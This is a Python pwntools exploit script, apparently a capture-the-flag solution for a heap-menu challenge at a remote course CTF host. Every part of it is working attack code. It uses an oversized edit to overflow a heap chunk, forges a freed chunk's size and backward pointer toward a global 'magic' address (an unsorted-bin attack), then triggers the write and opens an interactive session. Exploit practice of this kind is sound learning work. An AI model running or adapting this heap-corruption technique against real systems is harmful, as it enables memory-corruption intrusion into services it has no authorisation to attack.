#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
host = 'csie.ctf.tw'
port = 10144
magic = 0x00000000006020c0
r = remote(host, port)

def allocate(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(" : ")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def edit(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(" : ")
    r.sendline(str(size))
    r.recvuntil(" : ")
    r.sendline(content)

def delete(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

allocate(0x30, "aaaa") #0
allocate(0x80, "qqqq") #1
allocate(0x90, "zzzz") #2
delete(1)
edit(0, 0x100, "a"*0x30 + p64(0) + p64(0x91) + p64(0x0) + p64(magic - 0x10))
allocate(0x80, "ffff")
r.sendline("4869")
r.interactive()
